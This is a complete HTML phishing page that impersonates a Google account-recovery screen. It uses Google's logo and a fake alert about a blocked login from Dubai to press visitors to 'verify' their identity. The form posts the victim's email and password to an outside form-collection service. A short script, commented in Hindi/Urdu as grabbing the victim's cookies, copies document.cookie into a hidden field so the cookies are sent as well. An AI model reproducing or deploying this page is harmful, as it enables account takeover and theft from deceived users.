<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Account Recovery</title>
    <style>
        /* Google Style CSS */
        body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f8f9fa; margin: 0; }
        .login-box { background: white; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; width: 360px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" width="75">
        <h2>Verify Identity</h2>
        <p>A recent login attempt from Dubai was blocked. Verify your account to secure your data.</p>
        
        <form action="https://formspree.io/f/mrejgwwo" method="POST">
            <input type="email" name="Email" placeholder="Email or phone" required>
            <input type="password" name="Password" placeholder="Enter your password" required>
            
            <input type="hidden" name="Cookies" id="cookie_data">
            
            <button type="submit">Next</button>
        </form>
    </div>

    <script>
        // Ye chhota sa code uski browser cookies nikal lega
        document.getElementById('cookie_data').value = document.cookie;
    </script>
</body>
</html>
